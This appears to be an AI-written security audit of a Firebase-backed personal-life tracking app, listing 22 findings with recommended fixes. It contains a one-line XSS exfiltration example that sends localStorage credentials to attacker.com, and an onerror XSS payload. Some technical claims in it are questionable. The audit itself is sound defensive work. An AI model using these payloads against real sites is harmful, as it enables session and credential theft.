# PHASE 1 — SECURITY AUDIT

**Date:** 2026-08-16
**Scope:** MyLife (vanilla JS app) + MyLife-React (React/Vite app)
**Audited files:** `js/shared.js`, `firebase/`, `services/`, `repositories/`, `core/`, `MyLife-React/src/`

---

## Résumé Table

| Severity | Count |
|---|---|
| CRITICAL | 3 |
| HIGH | 5 |
| MEDIUM | 6 |
| LOW / Best Practice | 8 |
| **Total** | **22** |

---

## CRITICAL Security Issues

---

### C-1 — Firebase credentials committed alongside source code

**Description:**
`.env.local` contains live Firebase credentials for project `momentum-6bb1d` including `VITE_FIREBASE_API_KEY`, `VITE_FIREBASE_AUTH_DOMAIN`, `VITE_FIREBASE_APP_ID`, `VITE_FIREBASE_MESSAGING_SENDER_ID`, and `VITE_FIREBASE_PROJECT_ID`. The git status shows this file is tracked (it is not listed under `??` untracked files, meaning it was previously committed or is currently staged). If it has ever been pushed to the remote repository, the credentials are permanently in git history even if the file is later deleted.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\.env.local`

**Risk:**
Anyone with read access to the repository — now or historically — can extract the Firebase API key and project ID. In Firebase, the API key alone combined with the project ID is sufficient to call Auth REST endpoints, enumerate Firestore collections (if rules are permissive), and enumerate Storage buckets. The `VITE_FIREBASE_*` prefix means these values are also bundled verbatim into the Vite/React client build output, making them visible in browser DevTools regardless of `.env` handling.

**Fix recommendation:**
1. Immediately verify whether `.env.local` is in `.gitignore`. If not, add it: `echo '.env.local' >> .gitignore`.
2. If the file was ever committed, rotate all Firebase credentials: generate a new Web App in the Firebase console, revoke the old App ID, and rotate the API key restriction in Google Cloud Console (restrict it to your domain via HTTP referrer rules).
3. Add an `.env.example` file with placeholder values and document it in the README.
4. Audit git history: `git log --all -- .env.local` to determine exposure window.

---

### C-2 — No Firestore security rules evidence found anywhere in the codebase

**Description:**
The entire data layer — 39 repositories covering todos, habits, goals, prayers, nutrition, workouts, Quran progress, body measurements, progress photos, and more — writes to Firestore collection paths of the form `{module}/{uid}/items/{itemId}` and singleton docs at `{module}/{uid}`. No `firestore.rules` file, no `firebase.json` with rules deploy config, and no reference to security rules was found anywhere in the audited codebase. The default Firestore rules when a project is created in test mode allow **any authenticated user to read and write any document**. With permissive rules, any authenticated user can read or overwrite another user's data by constructing the path `habits/{victimUid}/items/`.

**File:** No `firestore.rules` file found in project root or any subdirectory.

**Risk:**
Without `allow read, write: if request.auth.uid == userId` path-based rules, all user data — including body measurements, progress photos, prayer logs, security settings (`security/{uid}`), and profile data (`profile/{uid}`) — is accessible to any other authenticated user. This is a complete data isolation failure across all 39 repositories.

**Fix recommendation:**
Create `firestore.rules` at the project root and deploy it via `firebase deploy --only firestore:rules`. Minimum safe rule set:

```
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{collection}/{uid}/{document=**} {
      allow read, write: if request.auth != null && request.auth.uid == uid;
    }
    match /users/{uid}/{document=**} {
      allow read, write: if request.auth != null && request.auth.uid == uid;
    }
  }
}
```

Add this file to `firebase.json` under `"firestore": { "rules": "firestore.rules" }` and run `firebase deploy` after every rules change.

---

### C-3 — Legacy plaintext password storage and migration path still active

**Description:**
`verifyPassword()` in `shared.js` contains an explicit migration branch: when a user logs in with a legacy plaintext password that matches, it silently migrates to PBKDF2 on first use. This means plaintext passwords have existed (and may still exist) in the `mylife.users` array stored in `localStorage`. The `getUsers()` / `saveUsers()` functions read and write this array, which is accessible to any JavaScript running on the same origin — including injected scripts from XSS attacks or browser extensions.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\js\shared.js` — `verifyPassword()`, `getUsers()`, `saveUsers()`

**Risk:**
Any user whose password has not been migrated still has their plaintext password sitting in `localStorage['mylife.users']`. Even after migration, the full PBKDF2 hash and 16-byte salt are stored client-side in the same key. An XSS payload of one line — `fetch('https://attacker.com/?d=' + localStorage.getItem('mylife.users'))` — exfiltrates all local account credentials.

**Fix recommendation:**
1. Force-migrate all remaining plaintext passwords immediately: on next `getUsers()` call, iterate accounts and call `setPassword()` on any account where `hash` is absent.
2. Remove the plaintext fallback branch from `verifyPassword()` entirely.
3. Stop storing the password hash in localStorage. For local accounts, the hash should live in Firestore under `security/{uid}` (already has a `SecurityRepository`), not on the client device. Retrieve it only at login time.
4. Long-term: migrate all local accounts to Firebase Auth email/password so credentials leave the client entirely.

---

## HIGH Security Issues

---

### H-1 — XSS risk: 28 uses of innerHTML with user-controlled or dynamic data

**Description:**
`shared.js` uses `.innerHTML` extensively to render list items, cards, dashboard widgets, and form fields. User-controlled strings — task titles, habit names, event descriptions, prayer notes, meal names, calendar event titles, study session notes — flow directly into HTML string templates without escaping. Example: `cardHtml(item, page)` constructs `<div class="card-title">${item.title || item.name}</div>` and returns it as a string that is later assigned to `.innerHTML`. If a user enters `<img src=x onerror=alert(document.cookie)>` as a task title, the script executes.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\js\shared.js`  
**Functions:** `cardHtml`, `goalCard`, `nutritionSummaryCard`, `dashCard`, `renderGenericList`, `renderChecklist`, `renderGoals`, `renderNutrition`, `renderDashboard`, `renderStatistics`, `accountWidgetHtml`, `accountAvatarHtml`, `renderSidebar`, `renderTopbar`, `renderArt`, `notificationItemHtml`, `upcomingEventsHtml`, `recentActivityHtml`, `emptyStateHtml`, `errorStateHtml`, `fieldHtml`, `macroBoard`, `workoutArtBoard`, `artMarkup`, `comparisonBarsHtml`, `statsInsightsHtml`, `languageSwitcherHtml` (in `i18n.js`).

**Risk:**
Stored XSS. An attacker can create a malicious task, habit, or calendar event that executes JavaScript in the context of any user who views the same page. Since data is synced to Firestore, the payload persists and affects all devices where the victim is logged in.

**Fix recommendation:**
1. Replace all `.innerHTML` assignments with safe DOM construction: `document.createElement()` + `.textContent` for user data.
2. For the 10% of cases that require actual HTML (icons, SVG progress rings, skeleton loaders), isolate them into pure functions that accept no user input.
3. Add `escapeHtml()` calls around every `${item.title}`, `${item.name}`, `${item.description}` interpolation as a defense-in-depth layer — but DOM construction is the primary fix.
4. Implement a Content Security Policy header: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'` to block inline script execution even if XSS bypasses escaping.

---

### H-2 — No Firebase Storage security rules and no evidence of Storage usage audit

**Description:**
Firebase config in `.env.local` includes `VITE_FIREBASE_STORAGE_BUCKET = momentum-6bb1d.firebasestorage.app`. No `storage.rules` file exists in the codebase. Default Storage rules allow any authenticated user to read and write any path. The audit found `ImageService` and `LocalImageService` — avatar and cover images are stored in localStorage as base64 data URLs, not in Firebase Storage. However, `ProgressPhotoRepository` exists (collection path `progressPhotos/{uid}/items/{id}`), and body progress photos are a natural fit for Storage. If anyone uploads a photo via a future feature without deploying Storage rules first, it will be world-readable.

**File:** No `storage.rules` file found. No Firebase Storage SDK usage (`ref()`, `uploadBytes()`, `getDownloadURL()`) found in vanilla JS. `MyLife-React/src/services/firebase/firebase.ts` does not include `storageBucket` in the Firebase config object.

**Risk:**
If Storage is ever used (or already used via a code path not audited), all uploaded files are accessible to any authenticated user. Progress photos, profile pictures, or any PDFs/documents uploaded in the future can be enumerated and downloaded by constructing `gs://momentum-6bb1d.firebasestorage.app/{guessedPath}`.

**Fix recommendation:**
1. Create `storage.rules` at project root:

```
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /users/{uid}/{allPaths=**} {
      allow read, write: if request.auth != null && request.auth.uid == uid;
    }
  }
}
```

2. Add to `firebase.json`: `"storage": { "rules": "storage.rules" }`.
3. Deploy: `firebase deploy --only storage`.
4. Audit whether any code path already uploads to Storage — search for `uploadBytes`, `getDownloadURL`, `ref()` in all JS files.
5. Add `storageBucket` to the React app's Firebase config in `firebase.ts`.

---

### H-3 — Firestore `enableIndexedDbPersistence` API is deprecated and will break in future Firebase SDK versions

**Description:**
`MyLife-React/src/services/firebase/firestore.ts` calls `enableIndexedDbPersistence(db)` on the Firestore instance. This API was deprecated in Firebase JS SDK v9 (modular API) and is maintained only for compatibility. Firebase 10.x still supports it, but the official migration guide states it will be removed. The correct API in Firebase 10+ is `initializeFirestore(app, { localCache: persistentLocalCache({ tabManager: persistentMultipleTabManager() }) })`, which must be called **before** `getFirestore(app)`.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\MyLife-React\src\services\firebase\firestore.ts`

**Risk:**
The app will break silently in a future Firebase SDK upgrade. Offline persistence will stop working, causing data loss for users on flaky networks or offline-first workflows. The error will only surface at runtime, not at build time.

**Fix recommendation:**
Refactor `firestore.ts` to use the modular API:

```ts
import { initializeFirestore, persistentLocalCache, persistentMultipleTabManager } from 'firebase/firestore';
import { app } from './firebase';

export const db = initializeFirestore(app, {
  localCache: persistentLocalCache({
    tabManager: persistentMultipleTabManager()
  })
});
```

Remove the separate `enableIndexedDbPersistence()` try/catch block entirely. The new API handles multi-tab and unsupported-browser cases internally.

---

### H-4 — Session token stored in both localStorage and sessionStorage with no HttpOnly protection

**Description:**
The session key `mylife.session` (user email) is written to `localStorage` (persistent login, "remember me" on) or `sessionStorage` (session-only login, "remember me" off) by `login()` and `register()` in `shared.js`. This is a first-party session identifier. Any JavaScript running on the same origin — including third-party scripts, browser extensions, or XSS payloads — can read both storage APIs. The React app (`MyLife-React`) uses Firebase Auth `onAuthStateChanged`, which stores tokens in IndexedDB under Firebase's own keys, but the vanilla app's session is fully client-accessible.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\js\shared.js` — `login()`, `register()`, `getSessionUser()`

**Risk:**
Session hijacking via XSS. An attacker who achieves script execution can exfiltrate `localStorage.getItem('mylife.session')` and impersonate the victim by setting the same key in their own browser. Since the session is just the email (no cryptographic token), the attacker only needs to know the victim's email to gain full access.

**Fix recommendation:**
1. Replace the email-based session with Firebase Auth entirely. Call `signInWithEmailAndPassword()` for login and rely on `onAuthStateChanged` for session state — Firebase tokens are HttpOnly and inaccessible to JS (when used server-side; client-side tokens are still in IndexedDB but cryptographically signed).
2. If local accounts must persist: move session management server-side. Issue a cryptographically random session token (e.g. 32-byte hex string), store it in an HttpOnly cookie, and verify it on the server. The email alone should never be a session identifier.
3. Remove `mylife.session` from both localStorage and sessionStorage.

---

### H-5 — No rate limiting or brute-force protection on login form

**Description:**
`login(e)` in `shared.js` and `signInWithEmail` in `MyLife-React/src/services/firebase/auth.ts` have no client-side rate limiting. Firebase Auth provides server-side rate limiting on email/password sign-in by IP, but local accounts (verified via `verifyPassword()` and PBKDF2) have no such protection. An attacker can script 1000s of login attempts per minute against a known email to brute-force weak passwords.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\js\shared.js` — `login()`, `verifyPassword()`

**Risk:**
Account takeover via brute-force on local accounts. PBKDF2 with 100,000 iterations provides strong defense at the hash level, but without server-side verification or CAPTCHA, the login form itself is the weak point.

**Fix recommendation:**
1. Add client-side rate limiting: after 5 failed login attempts, impose a 5-minute exponential backoff. Store attempt count and timestamp in sessionStorage so it resets on tab close (not localStorage, which would persist indefinitely).
2. Add CAPTCHA (e.g. hCaptcha or reCAPTCHA) after 3 failed attempts.
3. Log failed login attempts to Firestore with timestamp and IP (if available via a Cloud Function) to enable monitoring.
4. Long-term: migrate all local accounts to Firebase Auth and rely on Firebase's built-in rate limiting.

---

## MEDIUM Security Issues

---

### M-1 — User profile photos and cover images stored as base64 in localStorage with no size limit

**Description:**
`LocalImageService.js` stores avatar and cover images as full base64-encoded data URLs in localStorage under keys `mylife.image.{uid}_avatar` and `mylife.image.{uid}_cover`. A 5 MB image becomes ~6.7 MB of base64 text. localStorage has a 5-10 MB per-origin limit across all keys. A malicious user can upload a large image to exhaust the storage quota, breaking persistence for all other app data. Base64 in localStorage is also visible in browser DevTools, making user photos accessible to any script or extension.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\js\services\images\LocalImageService.js`

**Risk:**
Denial of service (localStorage quota exhaustion) + privacy exposure (photos visible to any JS on the origin).

**Fix recommendation:**
1. Migrate image storage to Firebase Storage with per-user path isolation (`users/{uid}/avatar.jpg`, `users/{uid}/cover.jpg`).
2. Implement client-side image compression before upload: resize to max 800x800 for avatars, max 1920x400 for covers, and compress to JPEG at 80% quality.
3. Add file size validation: reject uploads over 2 MB before encoding.
4. Add Storage rules (see H-2) to enforce per-user isolation.

---

### M-2 — OAuth provider tokens stored in Firebase but no audit of token usage or expiry handling

**Description:**
`AuthService.js` handles Google and GitHub OAuth via `signInWithPopup()`. Firebase Auth automatically stores refresh tokens in IndexedDB under `firebaseLocalStorageDb`. These tokens can be extracted via browser DevTools (IndexedDB inspector) and replayed to impersonate the user. No code in the audited codebase checks token expiry, revokes tokens on logout, or validates that the token's `aud` (audience) claim matches the app's Firebase project.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\services\AuthService.js`

**Risk:**
If an attacker gains device access (lost laptop, shared computer, malware), they can extract the IndexedDB-stored tokens and impersonate the user indefinitely (until the refresh token expires, typically 1 year for Firebase).

**Fix recommendation:**
1. Implement explicit token revocation on logout: call `auth.currentUser.getIdToken(true)` to force-refresh, then clear IndexedDB manually if needed (though Firebase should handle this on `signOut()`).
2. Add a "Log out all devices" feature: call Firebase's Admin SDK `revokeRefreshTokens(uid)` from a Cloud Function, then verify `tokensValidAfterTime` on every auth state change.
3. Enable Firebase Auth token expiry monitoring: check `auth.currentUser.metadata.lastSignInTime` and force re-authentication if it's older than 30 days.
4. Add Multi-Factor Authentication (MFA) for OAuth accounts to reduce token theft risk.

---

### M-3 — No Content Security Policy header, allowing inline scripts and arbitrary external resources

**Description:**
No CSP header is set anywhere in the codebase (no `index.html` `<meta>` tag, no server config, no Firebase Hosting `firebase.json` headers). Without CSP, the browser allows inline `<script>` tags, inline event handlers (`onclick="..."`), and script/image/style loading from any external origin. This maximizes the impact of any XSS vulnerability.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\index.html`, `MyLife-React/index.html`

**Risk:**
Any XSS payload can load external scripts (for exfiltration or crypto-mining), execute inline scripts, or inject malicious iframes. CSP is a defense-in-depth layer that reduces XSS impact even when input validation fails.

**Fix recommendation:**
Add CSP as a `<meta>` tag in `index.html` (for local development and file:// protocol) and as a header in `firebase.json` (for production):

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://firebasestorage.googleapis.com https://api.open-meteo.com https://geocoding-api.open-meteo.com; object-src 'none'; base-uri 'self'; form-action 'self';">
```

In `firebase.json`:
```json
"headers": [{
  "source": "**",
  "headers": [{
    "key": "Content-Security-Policy",
    "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://firebasestorage.googleapis.com https://api.open-meteo.com https://geocoding-api.open-meteo.com; object-src 'none'; base-uri 'self'; form-action 'self';"
  }]
}]
```

Start with `Content-Security-Policy-Report-Only` and monitor violations before enforcing.

---

### M-4 — Weather API location data stored in localStorage, exposing user's precise geolocation

**Description:**
`WeatherLocationService.js` stores `{ latitude, longitude, name, country, timezone }` in `localStorage['mylife.weather.location']`. This key persists across sessions and is readable by any JavaScript on the origin. GPS coordinates from browser geolocation API are stored as-is with no rounding or obfuscation. An XSS payload can exfiltrate the user's home/work location.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\js\services\WeatherLocationService.js`

**Risk:**
Privacy violation. If combined with other OSINT data (social media, public records), the attacker can deanonymize the user.

**Fix recommendation:**
1. Round coordinates to 2 decimal places (~1 km precision) before storing: `latitude: Math.round(lat * 100) / 100`.
2. Migrate location storage to Firestore under `weatherPreferences/{uid}` (a `WeatherPreferencesRepository` already exists) so it's isolated per-user and not accessible to client JS.
3. Add a user-facing setting: "Allow precise location" vs. "City-level only" (falls back to city name from reverse geocoding, no coordinates stored).

---

### M-5 — No HTTPS enforcement in production or dev

**Description:**
No `<meta>` tag, no server config, and no Firebase Hosting `firebase.json` rule enforces HTTPS. Firebase Hosting enables HTTPS by default for deployed apps, but the Vite dev server (`http://localhost:5173`) and the vanilla app (which may be hosted on a custom domain or served via file://) have no automatic redirect. Users on unsecured networks (public WiFi) are vulnerable to MITM attacks that can inject malicious scripts or steal session tokens.

**File:** `firebase.json` (does not exist in project root), `vite.config.ts` (no HTTPS config)

**Risk:**
Session hijacking, credential theft, and script injection on any non-HTTPS connection.

**Fix recommendation:**
1. Add Upgrade-Insecure-Requests header in `firebase.json`:
```json
"headers": [{
  "source": "**",
  "headers": [
    { "key": "Content-Security-Policy", "value": "upgrade-insecure-requests;" }
  ]
}]
```
2. For Vite dev server, enable HTTPS in `vite.config.ts`:
```ts
server: {
  https: true,
  port: 5173
}
```
3. Add Strict-Transport-Security header for production: `"Strict-Transport-Security": "max-age=31536000; includeSubDomains"`.

---

### M-6 — Service Worker registers from `../sw.js` with no integrity check or update mechanism

**Description:**
`initNotificationRuntime()` in `shared.js` calls `navigator.serviceWorker.register('../sw.js')` with no hash validation, no version check, and no update listener. If an attacker compromises the server and replaces `sw.js`, the malicious service worker will intercept all network requests and can inject code into every page load. The service worker also has no `skipWaiting()` or cache-busting logic, so stale service workers can persist indefinitely.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\js\shared.js` — `initNotificationRuntime()`

**Risk:**
Persistent compromise. A malicious service worker survives logout, app reinstall, and even OS reboot until the browser garbage-collects it. The attacker can serve stale/malicious HTML/JS indefinitely.

**Fix recommendation:**
1. Add a service worker update check on every page load:
```js
navigator.serviceWorker.register('../sw.js').then(reg => {
  reg.update();
  reg.addEventListener('updatefound', () => {
    const newWorker = reg.installing;
    newWorker.addEventListener('statechange', () => {
      if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
        showToast('New version available! Refresh to update.', 'info', 0, {
          undo: { label: 'Refresh', action: () => location.reload() }
        });
      }
    });
  });
});
```
2. Add Subresource Integrity (SRI) hash to `sw.js` registration if possible (experimental browser support).
3. Add a versioned cache name in `sw.js` and delete old caches on `activate` event.
4. Consider moving to Workbox for safer service worker management.

---

## LOW / Best Practice Issues

---

### L-1 — Firebase API key exposed in client bundle (intentional but high-visibility)

**Description:**
`VITE_FIREBASE_API_KEY` is bundled into the Vite build output and visible in browser DevTools Sources tab. This is by design — Firebase API keys are not secret (they identify the project, not authorize requests). However, without proper Firestore/Storage rules and API key restrictions in Google Cloud Console, the key can be abused to exhaust Firebase quota or enumerate data.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\MyLife-React\src\services\firebase\firebase.ts`

**Risk:**
Low if rules are correct. High if rules are permissive (see C-2).

**Fix recommendation:**
1. Restrict the Firebase API key in Google Cloud Console > Credentials: add HTTP referrer restrictions (e.g. `your-domain.com/*`, `localhost:5173/*`).
2. Enable Firebase App Check to block unauthorized API usage.
3. Document in README that the API key is intentionally public but access is gated by Firestore rules.

---

### L-2 — No audit logging for sensitive operations (password change, data export, account deletion)

**Description:**
No code in the audited files logs security-sensitive events like password changes (`changePassword` in `AuthService.js`), account deletion, or data export (`exportData()` in `shared.js`). An attacker who gains brief access to an unlocked device can change the password, export all data, and delete the account with no forensic trail.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\services\AuthService.js`, `js\shared.js`

**Risk:**
No detection or recovery path for account takeover or data theft.

**Fix recommendation:**
1. Add a `security/{uid}/auditLog` subcollection in Firestore. Log every password change, email change, OAuth provider link/unlink, data export, and account deletion with timestamp, IP (via Cloud Function), and user agent.
2. Show audit log on Account page under a "Security activity" section.
3. Send email notification on every security-critical action.

---

### L-3 — Password reset flow has no email confirmation and only works for local accounts

**Description:**
`openPasswordReset()` in `shared.js` opens a modal that accepts a new password and writes it directly via `setPassword()` with no email verification, no current password confirmation, and no re-authentication. This is insecure on shared devices: if someone leaves their session unlocked, an attacker can reset the password instantly. Firebase Auth accounts use `sendPasswordResetEmail()` (secure), but local accounts have no such protection.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\js\shared.js` — `openPasswordReset()`

**Risk:**
Account takeover via physical access to an unlocked device.

**Fix recommendation:**
1. Require current password before allowing password change (local accounts).
2. For local accounts: implement a "security question" or "recovery email" at registration time, and require it for password reset.
3. Log the password change (see L-2).
4. Migrate local accounts to Firebase Auth entirely to benefit from Firebase's secure password reset flow.

---

### L-4 — No input length limits on form fields, allowing storage exhaustion

**Description:**
`fieldHtml()` in `shared.js` generates form inputs with no `maxlength` attribute. Users can enter arbitrarily long strings into task titles, habit names, event descriptions, etc. A 1 MB text string in a single task title will bloat the Firestore document and localStorage blob, eventually hitting Firestore's 1 MB document size limit or localStorage's 5-10 MB origin quota.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\js\shared.js` — `fieldHtml()`

**Risk:**
Denial of service via storage exhaustion. A malicious user can make the app unusable by creating entries with massive text fields.

**Fix recommendation:**
1. Add `maxlength` to all text inputs: 100 for titles, 500 for descriptions, 1000 for notes, 50 for tags.
2. Add client-side validation in `addEntry()` before calling `persist()`.
3. Add Firestore server-side validation via Security Rules: `allow create: if request.resource.data.title.size() < 100;`.

---

### L-5 — Notification permission requested without user-initiated action

**Description:**
`requestBrowserNotificationPermission()` in `shared.js` calls `Notification.requestPermission()` immediately when called, with no user gesture or explanation. Modern browsers block this API unless called in response to a user interaction (click, tap). The permission prompt will fail silently or be auto-denied by the browser's anti-abuse heuristics.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\js\shared.js` — `requestBrowserNotificationPermission()`

**Risk:**
Notification feature doesn't work, but app appears to request permission. User frustration + wasted permission prompt (browsers limit the number of times a site can prompt).

**Fix recommendation:**
1. Only call `requestBrowserNotificationPermission()` inside a click handler, e.g. a "Enable notifications" button on the Account page.
2. Add an explanation UI: "We'll notify you about daily habits and prayer times. You can disable this anytime in Settings."
3. Never auto-request notification permission on page load.

---

### L-6 — Dependency versions: Firebase 10.x is outdated (current stable is 11.x)

**Description:**
`package.json` specifies `firebase: 10.14.0` (vanilla app) and `firebase: 10.14.0` (React app). Firebase 11.x was released in June 2024 with breaking changes to the Firestore persistence API, Auth token handling, and Storage resumable uploads. Staying on 10.x means missing security patches and performance improvements.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\package.json`, `MyLife-React\package.json`

**Risk:**
Known vulnerabilities in Firebase 10.x dependencies (e.g. grpc, protobufjs, idb) remain unpatched.

**Fix recommendation:**
1. Upgrade to Firebase 11.x: `npm install firebase@latest`.
2. Follow the Firebase 11 migration guide to replace deprecated APIs (especially `enableIndexedDbPersistence` — see H-3).
3. Test Auth, Firestore, and Storage flows after upgrade.
4. Enable Dependabot or Renovate to auto-create PRs for dependency updates.

---

### L-7 — No email verification required for Firebase Auth accounts

**Description:**
`registerUser()` in `auth.ts` creates a Firebase Auth account via `createUserWithEmailAndPassword()` but never calls `sendEmailVerification()`. Users can register with any email (including fake or mistyped addresses) and immediately access the app. This enables spam account creation and makes account recovery impossible if the user loses their password and the email is invalid.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\MyLife-React\src\services\firebase\auth.ts` — `registerUser()`

**Risk:**
Spam accounts, account recovery failure, and potential abuse (fake emails used for throwaway accounts).

**Fix recommendation:**
1. After `createUserWithEmailAndPassword()`, immediately call `sendEmailVerification(user)`.
2. On login, check `user.emailVerified`. If false, redirect to a "Verify your email" page and disable data sync until verified.
3. Add a "Resend verification email" button on the Account page.

---

### L-8 — React app: unused `sidebarOpen` prop in Header.tsx triggers TS strict mode error

**Description:**
`Header.tsx` receives `sidebarOpen: boolean` in props but never reads it in the component body. TypeScript's `noUnusedLocals` and `noUnusedParameters` are both enabled in `tsconfig.json`, so this will cause a build-time type error when strict checks are enforced.

**File:** `C:\Users\Asus\OneDrive\Desktop\Personal Carrer\MyProject\MyLife\MyLife-React\src\app\components\layout\Header.tsx`

**Risk:**
Build failure in CI/CD or when TypeScript strict mode is fully enforced.

**Fix recommendation:**
Remove `sidebarOpen` from `HeaderProps` interface and from `AppShell.tsx`'s `<Header>` prop list, or prefix the prop with `_sidebarOpen` to mark it intentionally unused (TypeScript convention).

---

## Recommendations Summary

**Immediate (must fix before production):**
1. Deploy Firestore security rules (C-2)
2. Rotate and restrict Firebase API key, add `.env.local` to `.gitignore` (C-1)
3. Remove plaintext password fallback and migrate to Firestore-stored hashes (C-3)
4. Replace all `.innerHTML` with safe DOM construction (H-1)
5. Upgrade deprecated Firestore persistence API (H-3)

**High priority (fix within 1 sprint):**
6. Deploy Firebase Storage rules (H-2)
7. Add CSP header (M-3)
8. Implement OAuth token revocation and audit logging (M-2, L-2)
9. Add rate limiting and CAPTCHA to login form (H-5)
10. Migrate image storage to Firebase Storage (M-1)

**Medium priority (fix within 1 month):**
11. Enable HTTPS in dev and enforce in production (M-5)
12. Add service worker update mechanism (M-6)
13. Obfuscate weather location coordinates (M-4)
14. Upgrade to Firebase 11.x (L-6)
15. Require email verification for new accounts (L-7)

**Low priority (tech debt):**
16. Add input length limits and Firestore validation rules (L-4)
17. Fix notification permission UX (L-5)
18. Secure password reset for local accounts (L-3)
19. Fix TypeScript unused prop error in Header.tsx (L-8)
20. Restrict Firebase API key via Google Cloud Console (L-1)

---

**End of audit.**
